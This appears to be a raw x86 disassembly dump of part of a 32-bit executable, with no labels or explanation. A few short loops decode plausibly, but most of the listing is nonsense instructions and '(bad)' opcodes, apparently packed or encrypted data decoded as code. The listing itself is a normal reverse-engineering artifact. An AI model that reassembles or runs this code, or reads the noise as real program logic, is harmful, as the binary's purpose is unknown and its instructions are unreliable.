  40acf1:	mov    DWORD PTR ds:0x4337ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4337ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43379f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x4010b382],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad9f
  40ad2c:	sub    cl,BYTE PTR [ebx]
  40ad2e:	scas   eax,DWORD PTR es:[edi]
  40ad2f:	shl    dl,1
  40ad31:	ficom  WORD PTR [edi+ecx*4-0xc5d973d]
  40ad38:	cmc    
  40ad39:	dec    esp
  40ad3a:	mov    ecx,0x5439a393
  40ad3f:	shl    ecx,cl
  40ad41:	lods   eax,DWORD PTR ds:[esi]
  40ad42:	sub    eax,DWORD PTR [ebp+0x34]
  40ad45:	add    BYTE PTR [edi+0x1b59a019],dl
  40ad4b:	aaa    
  40ad4c:	pop    ds
  40ad4d:	je     0x40adb5
  40ad4f:	mov    edx,0x3584feb5
  40ad54:	cli    
  40ad55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad56:	test   DWORD PTR ds:0xf5679ff6,edx
  40ad5c:	rcr    esp,1
  40ad5e:	in     eax,0x24
  40ad60:	and    edx,0xffffff9e
  40ad63:	ins    DWORD PTR es:[edi],dx
  40ad64:	ds je  0x40ad13
  40ad67:	mov    al,ds:0x2858b282
  40ad6c:	jbe    0x40ad50
  40ad6e:	in     al,0x9d
  40ad70:	add    cl,dh
  40ad72:	in     al,dx
  40ad73:	mov    WORD PTR [esi+edx*8],ss
  40ad76:	clc    
  40ad77:	jp     0x40aded
  40ad79:	push   0xa8933996
  40ad7e:	out    dx,al
  40ad7f:	mov    dh,0xba
  40ad81:	test   al,0xa5
  40ad83:	retf   0x9aa1
  40ad86:	in     eax,dx
  40ad87:	xor    esi,DWORD PTR [edx]
  40ad89:	jecxz  0x40ad43
  40ad8b:	in     eax,dx
  40ad8c:	leave  
  40ad8d:	les    ebx,FWORD PTR [ebx+0x6e1d0c20]
  40ad93:	xchg   DWORD PTR [esi-0x5b],ebx
  40ad96:	inc    edx
  40ad97:	add    eax,0xe3803ec6
  40ad9c:	inc    esp
  40ad9d:	loop   0x40ad1f
  40ad9f:	and    eax,0xb9e7a80a
  40ada4:	outs   dx,DWORD PTR ds:[esi]
  40ada5:	nop
  40ada6:	cdq    
  40ada7:	mov    bl,0xf6
  40ada9:	out    0xf2,eax
  40adab:	add    ebx,edx
  40adad:	or     DWORD PTR [ecx],ebx
  40adaf:	xor    edi,ecx
  40adb1:	or     bl,BYTE PTR [ecx]
  40adb3:	inc    esp
  40adb4:	pop    edi
  40adb5:	in     al,dx
  40adb6:	shl    DWORD PTR [eax],0x82
  40adb9:	jno    0x40adc6
  40adbb:	int    0x9d
  40adbd:	or     al,0xf0
  40adbf:	pop    esi
  40adc0:	lock rcr BYTE PTR [eax],cl
  40adc3:	and    al,0x32
  40adc5:	imul   ebp,DWORD PTR gs:[ebx],0xffffffb1
  40adc9:	sahf   
  40adca:	shl    edx,1
  40adcc:	data16 daa 
  40adce:	xor    BYTE PTR [edx-0xb],dl
  40add1:	ja     0x40ad6e
  40add3:	pushf  
  40add4:	add    BYTE PTR [esi+0x3865f7ff],ch
  40adda:	retf   
  40addb:	imul   edi,edx,0x5b4d7222
  40ade1:	jle    0x40ad85
  40ade3:	push   ebp
  40ade4:	cli    
  40ade5:	jnp    0x40adc2
  40ade7:	inc    esp
  40ade8:	(bad)  
  40ade9:	in     al,0xe3
  40adeb:	mov    edi,0xc4c4da55
  40adf0:	lods   al,BYTE PTR ds:[esi]
  40adf1:	push   edi
  40adf2:	add    esp,0xffffff99
  40adf5:	shl    BYTE PTR [esi-0x6e9d8e5a],0xa9
  40adfc:	int3   
  40adfd:	sub    al,BYTE PTR [edx]
  40adff:	stc    
  40ae00:	cmp    eax,DWORD PTR [eax-0x1]
  40ae03:	adc    DWORD PTR [ebx-0x7542abf8],edx
  40ae09:	mov    ah,0xf4
  40ae0b:	fndisi(8087 only) 
  40ae0d:	xor    bl,dh
  40ae0f:	inc    edx
  40ae10:	or     al,0x2
  40ae12:	mov    eax,0xf8494496
  40ae17:	adc    DWORD PTR [eax+0x36],esi
  40ae1a:	sbb    DWORD PTR [esi],edx
  40ae1c:	jmp    0xd1af:0xf0ff24d
  40ae23:	push   ecx
  40ae24:	lea    ebp,[esi]
  40ae26:	jno    0x40adf5
  40ae28:	mov    bh,0x9a
  40ae2a:	gs push 0x21bf5388
  40ae30:	je     0x40ae7b
  40ae32:	mov    esi,0x25c53b2a
  40ae37:	xor    DWORD PTR [eax-0x5976f206],eax
  40ae3d:	fdivp  st(0),st
  40ae3f:	jnp    0x40ae7b
  40ae41:	mov    esp,edx
  40ae43:	mov    ecx,DWORD PTR [ecx-0x13]
  40ae46:	scas   eax,DWORD PTR es:[edi]
  40ae47:	sar    BYTE PTR [ebx+0x7558be14],cl
  40ae4d:	int    0xe6
  40ae4f:	xor    eax,0x57f6f43f
  40ae54:	pop    edi
  40ae55:	inc    ebp
  40ae56:	jns    0x40ae42
  40ae58:	jmp    0xcc29:0xae63c98e
  40ae5f:	and    ecx,DWORD PTR [esi-0x20a26ab6]
  40ae65:	jg     0x40ae5f
  40ae67:	(bad)  
  40ae68:	and    al,bh
  40ae6a:	dec    esi
  40ae6b:	and    ch,BYTE PTR [edx+esi*8+0xd370b17]
  40ae72:	xor    DWORD PTR [edx+0x629bdc6b],ebp
  40ae78:	mov    ebp,0x4c1af26a
  40ae7d:	adc    DWORD PTR [ebp-0x5b],eax
  40ae80:	nop
  40ae81:	sub    DWORD PTR ds:0x13130a04,edi
  40ae87:	cmp    al,0xe
  40ae89:	pop    edi
  40ae8a:	add    DWORD PTR [ebp+0x39],edx
  40ae8d:	jmp    0x752e:0x2c2f707a
  40ae94:	or     cl,bl
  40ae96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae97:	jne    0x40ae72
  40ae99:	lea    ecx,[ebx]
  40ae9b:	retf   
  40ae9c:	aaa    
  40ae9d:	hlt    
  40ae9e:	hlt    
  40ae9f:	xlat   BYTE PTR ds:[bx]
  40aea1:	xor    DWORD PTR ds:0x6cd21989,0x49f28c13
  40aeab:	es add eax,0xb721595a
  40aeb1:	cmovl  edi,DWORD PTR [ecx-0x2e]
  40aeb5:	gs cmc 
  40aeb7:	nop
  40aeb8:	ja     0x40aee7
  40aeba:	or     ch,dl
  40aebc:	mov    esp,0x640ecdcb
  40aec1:	xlat   BYTE PTR ds:[ebx]
  40aec2:	(bad)  
  40aec3:	cmc    
  40aec4:	cdq    
  40aec5:	mov    esp,0xf1992d29
  40aeca:	int    0x17
  40aecc:	and    al,0x97
  40aece:	push   esi
  40aecf:	fcomi  st,st(1)
  40aed1:	fcomp  DWORD PTR ds:0xc9f22115
  40aed7:	ret    
  40aed8:	xor    DWORD PTR [esi+0x47],edi
  40aedb:	sbb    eax,0x9e6109ed
  40aee0:	adc    al,0xaf
  40aee2:	outs   dx,BYTE PTR ds:[esi]
  40aee3:	stos   DWORD PTR es:[edi],eax
  40aee4:	imul   DWORD PTR [ebp-0x20ac7c5f]
  40aeea:	push   es
  40aeeb:	imul   ebp,edi,0x18
  40aeee:	jne    0x40af3b
  40aef0:	xor    ch,BYTE PTR [edi]
  40aef2:	sar    BYTE PTR [ebx-0x75],1
  40aef5:	and    BYTE PTR [esi+0x224eb872],bh
  40aefb:	fadd   st(0),st
  40aefd:	or     ecx,DWORD PTR [esp+ecx*1]
  40af00:	les    ecx,FWORD PTR [edx+0xe946d27]
  40af06:	dec    esp
  40af07:	mov    cl,0x5e
  40af09:	sub    al,0xd0
  40af0b:	push   ebp
  40af0c:	xchg   DWORD PTR [ebx+ecx*4+0x7af3f6b],edi
  40af13:	push   ss
  40af14:	add    DWORD PTR [edx-0x86fe656],ecx
  40af1a:	lock bound ebp,QWORD PTR [ecx]
  40af1d:	mov    ecx,0x2e954cb9
  40af22:	jp     0x40af86
  40af24:	test   BYTE PTR [esi+0x3c9939c9],ah
  40af2a:	(bad)  
  40af2b:	lds    edx,FWORD PTR [ecx-0x5f]
  40af2e:	(bad)  
  40af2f:	cmc    
  40af30:	dec    esp
  40af31:	pop    ecx
  40af32:	ds fsub st(1),st
  40af35:	inc    esp
  40af36:	inc    edi
  40af37:	(bad)  
  40af38:	(bad)  
  40af3a:	dec    edi
  40af3b:	pop    ds
  40af3c:	or     BYTE PTR [esi],dl
  40af3e:	stos   BYTE PTR es:[edi],al
  40af3f:	sbb    ah,bh
  40af41:	push   ebp
  40af42:	enter  0xa34f,0x88
  40af46:	add    eax,0xbfb333dc
  40af4b:	(bad)  
  40af4c:	test   eax,0xc42b97ee
  40af51:	or     al,0xc2
  40af53:	js     0x40af52
  40af55:	cmp    cl,BYTE PTR [edx-0x10]
  40af58:	sub    BYTE PTR [edx-0x53],0xb6
  40af5c:	jb     0x40af7a
  40af5e:	xchg   esi,eax
  40af5f:	push   0x99217c45
  40af64:	jp     0x40afdc
  40af66:	(bad)  
  40af67:	dec    ebp
  40af68:	add    edx,0xffffffa1
  40af6b:	inc    DWORD PTR [ebx]
  40af6d:	cmc    
  40af6e:	addr16 mov ebx,0x18408bc8
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4337a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43375f
  40af93:	sub    DWORD PTR ds:0x43370f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43375b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43375b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43375b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43375b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43375b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43375b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43375b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43375b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4337a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	jnp    0x40afcf
  40b019:	push   edx
  40b01a:	sti    
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	aas    
  40b024:	cwde   
  40b025:	clc    
  40b026:	mov    BYTE PTR [edx+0x12],bh
  40b029:	ret    0xf323
  40b02c:	jl     0x40b080
  40b02e:	mov    bh,BYTE PTR [ebx-0x6]
  40b031:	popa   
  40b032:	(bad)  
  40b033:	cld    
  40b034:	cwde   
  40b035:	dec    ebp
  40b036:	fsubr  DWORD PTR [edi-0x3]
  40b039:	in     al,dx
  40b03a:	fptan  
  40b03c:	imul   edx
  40b03e:	nop
  40b03f:	and    ah,bl
  40b041:	out    0xd9,eax
  40b043:	aam    0x46
  40b045:	and    BYTE PTR [eax-0x6a],dh
  40b048:	mov    ecx,0xde018bf1
  40b04d:	sar    BYTE PTR [ebp+0x36],cl
  40b050:	pop    edi
  40b051:	xchg   ebx,eax
  40b052:	ss push ds
  40b054:	pop    edi
  40b055:	or     ecx,eax
  40b057:	sbb    al,0x54
  40b059:	cmp    al,0x48
  40b05b:	jmp    0xf212:0x3cb88b11
  40b062:	fld    DWORD PTR [ecx+0x6a]
  40b065:	xlat   BYTE PTR ds:[ebx]
  40b066:	sbb    cl,BYTE PTR [edi+ecx*4]
  40b069:	add    BYTE PTR [edx],dh
  40b06b:	mov    edi,0x4fb1b0e2
  40b070:	(bad)  [ebp+0x1e]
  40b073:	imul   eax,DWORD PTR [ebx+0x2b5bbf02],0xaedc9b49
  40b07d:	in     al,dx
  40b07e:	dec    esi
  40b07f:	jl     0x40b0c8
  40b081:	pushf  
  40b082:	lahf   
  40b083:	and    DWORD PTR [ebx-0x2c],esp
  40b086:	dec    esp
  40b087:	xchg   ebx,eax
  40b088:	xor    al,0x66
  40b08a:	stc    
  40b08b:	pop    ds
  40b08c:	and    BYTE PTR [esi-0x4d],bh
  40b08f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b090:	add    DWORD PTR ds:0x658d755d,ebp
  40b096:	sbb    BYTE PTR [edi+0x7959f517],cl
  40b09c:	test   al,0x72
  40b09e:	ret    0x12d
  40b0a1:	dec    edi
  40b0a2:	shr    DWORD PTR [edx-0x5eaed2c9],cl
  40b0a8:	adc    eax,0x31bede59
  40b0ad:	or     DWORD PTR [edx],ecx
  40b0af:	xor    bh,dh
  40b0b1:	pop    esp
  40b0b2:	mov    edx,0x6e661c6a
  40b0b7:	xchg   ecx,eax
  40b0b8:	in     al,dx
  40b0b9:	sub    ebx,esi
  40b0bb:	outs   dx,DWORD PTR ds:[esi]
  40b0bc:	(bad)  
  40b0bd:	test   BYTE PTR [ebx+0x1f],0x8b
  40b0c1:	fsubr  st(2),st
  40b0c3:	mov    edi,0xae4765d8
  40b0c8:	lods   al,BYTE PTR ds:[esi]
  40b0c9:	add    BYTE PTR [ebx+0x4d],bh
  40b0cc:	paddusw mm5,QWORD PTR [esi-0x27]
  40b0d0:	sbb    DWORD PTR [ecx+0x5d361468],esp
  40b0d6:	jae    0x40b098
  40b0d8:	stos   BYTE PTR es:[edi],al
  40b0d9:	jae    0x40b0a4
  40b0db:	(bad)  
  40b0dc:	loope  0x40b101
  40b0de:	xor    bh,ah
  40b0e0:	push   eax
  40b0e1:	mov    ch,0xc8
  40b0e3:	pop    edx
  40b0e4:	enter  0x543e,0xf
  40b0e8:	push   ebp
  40b0e9:	mov    al,0xff
  40b0eb:	out    0xca,al
  40b0ed:	push   es
  40b0ee:	inc    ecx
  40b0ef:	popa   
  40b0f0:	sar    ebx,1
  40b0f2:	fcom   DWORD PTR [edx+0x733465ef]
  40b0f8:	push   ds
  40b0f9:	sti    
  40b0fa:	cmc    
  40b0fb:	mov    edx,0x26d9625d
  40b100:	cmp    ecx,DWORD PTR [ebx+0x44]
  40b103:	sbb    ebp,0xffffffc3
  40b106:	push   cs
  40b107:	imul   edi,DWORD PTR [ebx],0x123e2e12
  40b10d:	pusha  
  40b10e:	mov    dh,0x53
  40b110:	xor    BYTE PTR [edx-0x3746cb21],dl
  40b116:	xchg   DWORD PTR [eax],ebx
  40b118:	add    eax,0x3ff035ce
  40b11d:	outs   dx,DWORD PTR ds:[esi]
  40b11e:	nop
  40b11f:	rcr    DWORD PTR [eax-0x4b0c31b1],cl
  40b125:	and    ebx,DWORD PTR [eax-0x163e5ba]
  40b12b:	mov    edx,0xe645b296
  40b130:	xchg   ebp,eax
  40b131:	fwait
  40b132:	cmp    ebp,ecx
  40b134:	outs   dx,BYTE PTR ds:[esi]
  40b135:	fwait
  40b136:	popa   
  40b137:	pop    esp
  40b138:	rcl    BYTE PTR [ecx-0x5f],cl
  40b13b:	sub    al,0xc7
  40b13d:	mov    eax,ds:0x6465d290
  40b142:	sbb    eax,0x540f24a8
  40b147:	pop    edi
  40b148:	daa    
  40b149:	jp     0x40b1a5
  40b14b:	push   0xdafb0897
  40b150:	and    al,0xdb
  40b152:	sbb    esi,DWORD PTR [ebx]
  40b154:	jl     0x40b1cc
  40b156:	fdivr  st,st(5)
  40b158:	ins    BYTE PTR es:[edi],dx
  40b159:	cmp    edx,edx
  40b15b:	push   edx
  40b15c:	sub    bl,dh
  40b15e:	push   ds
  40b15f:	cld    
  40b160:	and    eax,0xe4e9c4ca
  40b165:	dec    esp
  40b166:	add    DWORD PTR [esi],esi
  40b168:	jbe    0x40b15c
  40b16a:	aad    0xab
  40b16c:	fldenv [edx-0x3d]
  40b16f:	jmp    0x40b17e
  40b171:	shl    edx,1
  40b173:	sar    BYTE PTR [eax+eax*8+0x40],cl
  40b177:	or     ecx,DWORD PTR [ecx-0x76bad34f]
  40b17d:	mov    ds:0xe0e4dc8c,eax
  40b182:	push   ss
  40b183:	xchg   ebp,eax
  40b184:	pop    ecx
  40b185:	leave  
  40b186:	outs   dx,DWORD PTR ds:[esi]
  40b187:	dec    ecx
  40b188:	sub    BYTE PTR [esi],ch
  40b18a:	jp     0x40b1d0
  40b18c:	int3   
  40b18d:	mov    ch,0x3f
  40b18f:	mov    eax,0xade68c8e
  40b194:	adc    eax,0xf9cb137
  40b199:	inc    ebx
  40b19a:	outs   dx,BYTE PTR fs:[esi]
  40b19c:	fnstcw WORD PTR [ebx+ebp*4]
  40b19f:	in     eax,0xde
  40b1a1:	ds pop eax
  40b1a3:	cmp    eax,0xf6a2da7d
  40b1a8:	mov    edi,0xa5f29d4f
  40b1ad:	mov    eax,0x93973662
  40b1b2:	mov    esp,0xbe30476e
  40b1b7:	das    
  40b1b8:	mov    ah,0x2c
  40b1ba:	sub    BYTE PTR [eax],0xc7
  40b1bd:	or     ah,BYTE PTR [edi]
  40b1bf:	jmp    0x1936:0x88e962b
  40b1c6:	sti    
  40b1c7:	mov    ah,0xda
  40b1c9:	fcmovbe st,st(7)
  40b1cb:	push   edi
  40b1cc:	call   0xff322798
  40b1d1:	lods   al,BYTE PTR ds:[esi]
  40b1d2:	fnsave [edx+0x64]
  40b1d5:	imul   ecx,DWORD PTR [esi+0x77],0x5e
  40b1d9:	rcr    BYTE PTR [edx-0x7f731964],1
  40b1df:	sbb    DWORD PTR [edi+0x24],ecx
  40b1e2:	and    al,0x97
  40b1e4:	fisub  WORD PTR [ecx-0x51]
  40b1e7:	ins    DWORD PTR es:[edi],dx
  40b1e8:	add    al,0xac
  40b1ea:	mov    WORD PTR [ebx+eiz*8-0x154cb6d],fs
  40b1f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1f2:	sbb    ecx,DWORD PTR [esi+0x5c61a3a]
  40b1f8:	mov    bh,ch
  40b1fa:	pop    edx
  40b1fb:	or     edi,0x7814a34
  40b201:	sar    DWORD PTR [eax-0xf],cl
  40b204:	add    al,0x7b
  40b206:	ror    BYTE PTR [edi-0x5934104d],1
  40b20c:	jo     0x40b248
  40b20e:	sub    DWORD PTR [ebp+0x4],edx
  40b211:	gs loope 0x40b1d8
  40b214:	xchg   BYTE PTR [edi-0x2d],bh
  40b217:	cmp    DWORD PTR [ecx+0x6648b2a2],eax
  40b21d:	cmp    ch,ah
  40b21f:	fstp   QWORD PTR [ebx]
  40b221:	adc    cl,BYTE PTR [eax]
  40b223:	add    DWORD PTR [ecx+0x50],ecx
  40b226:	jno    0x40b26c
  40b228:	lds    esi,FWORD PTR [eax]
  40b22a:	call   0x801d:0x344c29fd
  40b231:	call   DWORD PTR [ebx+ebx*4]
  40b234:	jmp    0x40b1c9
  40b236:	or     ebx,DWORD PTR [edx+0x20ab093b]
  40b23c:	jae    0x40b1f0
  40b23e:	sub    al,0xad
  40b240:	sub    BYTE PTR [ebx],0x45
  40b243:	mov    ah,0xb5
  40b245:	cwde   
  40b246:	mov    bl,0x8f
  40b248:	scas   eax,DWORD PTR es:[edi]
  40b249:	cmp    bl,bh
  40b24b:	aad    0x96
  40b24d:	pop    ecx
  40b24e:	sbb    DWORD PTR [eax-0x7f],esi
  40b251:	mov    ch,0xb8
  40b253:	mov    ebp,0x2da03e48
  40b258:	inc    esi
  40b259:	lahf   
  40b25a:	idiv   DWORD PTR [ebp*4+0x2716bdfb]
  40b261:	icebp  
  40b262:	pop    ds
  40b263:	shl    esp,0x95
  40b266:	jno    0x40b1f2
  40b268:	ja     0x40b1f5
  40b26a:	inc    ebp
  40b26b:	in     al,dx
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	inc    ebp
  40b284:	(bad)  
  40b285:	xor    BYTE PTR [ecx+0x2e],bl
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	out    0x8e,al
  40b291:	sbb    DWORD PTR [edx],esi
  40b293:	jnp    0x40b29b
  40b295:	call   0x9bf56a2b
  40b29a:	out    0x75,eax
  40b29c:	add    dh,BYTE PTR [edi-0x2d19420b]
  40b2a2:	loope  0x40b2c2
  40b2a4:	mov    ah,bh
  40b2a6:	jle    0x40b30c
  40b2a8:	push   ss
  40b2a9:	pop    esi
  40b2aa:	leave  
  40b2ab:	(bad)  
  40b2ac:	sub    cl,BYTE PTR [edx+0x6ab984e5]
  40b2b2:	adc    BYTE PTR [ecx+0x4ed5b0b0],al
  40b2b8:	cwde   
  40b2b9:	cmp    eax,0xfa703d4a
  40b2be:	sbb    al,0xfd
  40b2c0:	cmp    BYTE PTR [edi+0x47daeb01],ah
  40b2c6:	ds jmp 0x40b292
  40b2c9:	cwde   
  40b2ca:	cmp    al,0x19
  40b2cc:	scas   eax,DWORD PTR es:[edi]
  40b2cd:	lds    ebp,FWORD PTR [eax]
  40b2cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2d0:	imul   ecx,DWORD PTR [edx+ecx*8],0x18
  40b2d4:	(bad)  
  40b2d5:	adc    al,0xe5
  40b2d7:	mov    dl,0x69
  40b2d9:	loop   0x40b324
  40b2db:	sahf   
  40b2dc:	call   0x336bdb64
  40b2e1:	adc    al,0x2a
  40b2e3:	and    eax,0x717cf180
  40b2e8:	ror    DWORD PTR [ebp-0x7a6d7e60],0x16
  40b2ef:	sbb    al,0xd3
  40b2f1:	test   eax,0xe3c59f01
  40b2f6:	sub    BYTE PTR [edx+eax*4-0x40e5b3fd],dh
  40b2fd:	jmp    0x983b9a3e
  40b302:	xor    DWORD PTR [edi],esi
  40b304:	xchg   DWORD PTR [edi+edx*4-0x2c],ecx
  40b308:	xor    ah,BYTE PTR [eax-0x10]
  40b30b:	enter  0x56a5,0x4a
  40b30f:	aam    0x7f
  40b311:	or     edx,DWORD PTR [edx]
  40b313:	jbe    0x40b34f
  40b315:	and    bl,BYTE PTR [edx+esi*8]
  40b318:	sbb    BYTE PTR [edx],0xc5
  40b31b:	inc    DWORD PTR [esi-0x19]
  40b31e:	hlt    
  40b31f:	ret    0xa296
  40b322:	cmp    BYTE PTR [esp+edi*2],ch
  40b325:	stos   BYTE PTR es:[edi],al
  40b326:	cld    
  40b327:	jg     0x40b2a9
  40b329:	cmp    DWORD PTR ds:0xab71c06d,0xffffffe3
  40b330:	jns    0x40b39d
  40b332:	mov    ds:0xc0d6caa9,eax
  40b337:	(bad)  
  40b338:	push   esp
  40b339:	push   cs
  40b33a:	retf   
  40b33b:	cmp    al,0xe9
  40b33d:	int3   
  40b33e:	ja     0x40b321
  40b340:	into   
  40b341:	and    al,0xbd
  40b343:	neg    al
  40b345:	xor    eax,0x3ed01dab
  40b34a:	inc    esi
  40b34b:	mov    ebx,0xd253152d
  40b350:	(bad)  
  40b351:	dec    esi
  40b352:	or     al,0xa1
  40b354:	(bad)  
  40b355:	and    al,0x36
  40b357:	xchg   BYTE PTR [esi-0x52],ch
  40b35a:	cmp    eax,DWORD PTR [edx-0x388f924a]
  40b360:	pop    esp
  40b361:	jbe    0x40b337
  40b363:	test   DWORD PTR [edi+edx*2+0x2b],edx
  40b367:	(bad)  
  40b368:	fist   WORD PTR [ecx+eax*4]
  40b36b:	fcmovu st,st(1)
  40b36d:	mov    ecx,ebp
  40b36f:	cdq    
  40b370:	lods   eax,DWORD PTR ds:[esi]
  40b371:	jle    0x40b371
  40b373:	aas    
  40b374:	imul   ecx,DWORD PTR [ebx+0x59ea3bb],0x9999f43b
  40b37e:	je     0x40b39c
  40b380:	or     DWORD PTR ds:0x408efeca,esi
  40b386:	in     eax,0x66
  40b388:	not    DWORD PTR [esi]
  40b38a:	inc    ebp
  40b38b:	leave  
  40b38c:	mov    al,0x13
  40b38e:	psubq  mm4,QWORD PTR ds:0x50b9a987
  40b395:	bound  eax,QWORD PTR [ebx+0x141d5863]
  40b39b:	cmp    al,0x72
  40b39d:	sub    esi,DWORD PTR [esp+esi*1+0x16]
  40b3a1:	inc    ecx
  40b3a2:	add    al,0x32
  40b3a4:	data16 and al,0xc6
  40b3a7:	xchg   ebx,eax
  40b3a8:	shl    DWORD PTR [esi-0x7ba165a9],0x66
  40b3af:	es cwde 
  40b3b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3b2:	pop    eax
  40b3b3:	es inc ebp
  40b3b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3b6:	sbb    edi,DWORD PTR [edi]
  40b3b8:	push   edi
  40b3b9:	mov    eax,ds:0xfc8d40ce
  40b3be:	jl     0x40b3e6
  40b3c0:	add    eax,0x1724a95f
  40b3c5:	or     DWORD PTR [eax-0x1e],edx
  40b3c8:	cwde   
  40b3c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3ca:	inc    esi
  40b3cb:	rcr    DWORD PTR ds:0xf0361fc7,cl
  40b3d1:	aam    0xc3
  40b3d3:	jmp    0x40b356
  40b3d5:	mov    al,0xe5
  40b3d7:	(bad)  
  40b3d8:	(bad)  
  40b3d9:	stc    
  40b3da:	cs pop ebx
  40b3dc:	and    dh,BYTE PTR gs:[eax]
  40b3df:	shr    DWORD PTR [ebx],1
  40b3e1:	add    eax,0x37fdb7cd
  40b3e6:	test   eax,0x431888ae
  40b3eb:	call   0x8bfbaefb
  40b3f0:	dec    edi
  40b3f1:	sbb    al,0xec
  40b3f3:	mov    ebp,es
  40b3f5:	repz dec edx
  40b3f7:	rol    BYTE PTR [ecx+edi*2+0x3f],0xfd
  40b3fc:	push   ebx
  40b3fd:	mov    es,ecx
  40b3ff:	and    eax,ebp
  40b401:	sbb    BYTE PTR [ebx-0x68],cl
  40b404:	shl    BYTE PTR [edx],1
  40b406:	sub    edi,DWORD PTR [eax+0x61]
  40b409:	mov    ebp,0x18dbd8be
  40b40e:	fistp  QWORD PTR [edi+0x47]
  40b411:	ret    
  40b412:	jp     0x40b3a4
  40b414:	jae    0x40b447
  40b416:	arpl   WORD PTR [edx+0x29],ax
  40b419:	mov    eax,0x88b37a71
  40b41e:	and    ecx,DWORD PTR [ebp+0x4]
  40b421:	adc    al,BYTE PTR [esi+0x58]
  40b424:	test   al,0x5a
  40b426:	pusha  
  40b427:	sti    
  40b428:	adc    eax,0x7d1a1ff4
  40b42d:	jge    0x40b429
  40b42f:	jo     0x40b3c6
  40b431:	scas   al,BYTE PTR es:[edi]
  40b432:	nop
  40b433:	call   0xefbf694e
  40b438:	test   DWORD PTR [eax+0x2f],0x1d17138c
  40b43f:	pop    esp
  40b440:	xchg   esi,eax
  40b441:	pop    edx
  40b442:	mov    edx,0xebde172
  40b447:	int    0x56
  40b449:	ja     0x40b48d
  40b44b:	xor    eax,DWORD PTR [ebx+eiz*4]
  40b44e:	icebp  
  40b44f:	clc    
  40b450:	dec    esi
  40b451:	jns    0x40b4a0
  40b453:	add    bl,dl
  40b455:	jp     0x40b465
  40b457:	nop
  40b458:	nop
  40b459:	cld    
  40b45a:	pop    esi
  40b45b:	(bad)
  40b45f:	ins    BYTE PTR es:[edi],dx
  40b460:	adc    ebp,DWORD PTR [eax-0x5b337ce5]
  40b466:	inc    edi
  40b467:	jle    0x40b44d
  40b469:	xlat   BYTE PTR ds:[ebx]
  40b46a:	mov    bl,bh
  40b46c:	in     eax,dx
  40b46d:	ss cli 
  40b46f:	and    eax,esi
  40b471:	(bad)  
  40b472:	out    0xf2,eax
  40b474:	mov    dh,0x6c
  40b476:	inc    ecx
  40b477:	(bad)  
  40b478:	scas   al,BYTE PTR es:[edi]
  40b479:	fld    QWORD PTR [ebx]
  40b47b:	bound  eax,QWORD PTR [edx+0x73c77eb5]
  40b481:	mov    ah,0x52
  40b483:	xchg   edx,eax
  40b484:	adc    eax,0xd31756a7
  40b489:	jmp    0x62f8fcee
  40b48e:	daa    
  40b48f:	push   eax
  40b490:	sub    eax,0xbe29528e
  40b495:	cdq    
  40b496:	sub    DWORD PTR [ebx+0x4f40e649],edi
  40b49c:	enter  0xc4,0xf4
  40b4a0:	mov    ds:0x5ba0ca39,al
  40b4a5:	jns    0x40b42a
  40b4a7:	dec    ecx
  40b4a8:	pop    es
  40b4a9:	mov    ah,0x47
  40b4ab:	jae    0x40b52a
  40b4ad:	sub    BYTE PTR [ecx+ebp*2],dh
  40b4b0:	fist   DWORD PTR [ebx+ebx*1]
  40b4b3:	sub    al,0xf0
  40b4b5:	add    BYTE PTR [ebp-0x663bbf54],ah
  40b4bb:	les    edx,FWORD PTR ds:[esi+0x6a]
  40b4bf:	jl     0x40b4e2
  40b4c1:	pop    edx
  40b4c2:	inc    edx
  40b4c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4c4:	in     al,dx
  40b4c5:	ss xor al,0x85
